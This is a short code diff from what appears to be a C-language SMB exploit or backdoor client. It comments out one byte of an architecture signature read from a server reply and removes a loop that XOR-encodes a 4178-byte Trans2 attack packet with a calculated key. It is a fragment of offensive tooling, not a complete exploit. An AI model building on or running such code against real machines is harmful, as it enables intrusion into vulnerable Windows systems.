@@ -664,7 +664,9 @@ int main(int argc, char* argv[])
 	signature[1] = recvbuff[19];
 	signature[2] = recvbuff[20];
 	signature[3] = recvbuff[21];
-	signature[4] = recvbuff[22];
+	
+	//this determines the architecture
+	//signature[4] = recvbuff[22];
 	
 	//convert the signature buffer to unsigned integer 
 	memcpy((unsigned int*)&sig, (unsigned int*)&signature, sizeof(unsigned int));
@@ -715,11 +717,6 @@ int main(int argc, char* argv[])
 	//Then fill the packet with 0x00s and XOR it with the calculated key
 	unsigned char *big_packet = (unsigned char*)malloc(4178+1);
 	memset(big_packet, 0x00, 4178);
-	int bp;
-	for(bp=0;bp<4178;bp++)
-	{
-		big_packet[bp] = big_packet[bp] ^ XorKey;
-        }
 
 	//Copy Trans2 Information
 	//Update the values (TreeID, UserID, Multiplex, ProcessID) for the SMB packet
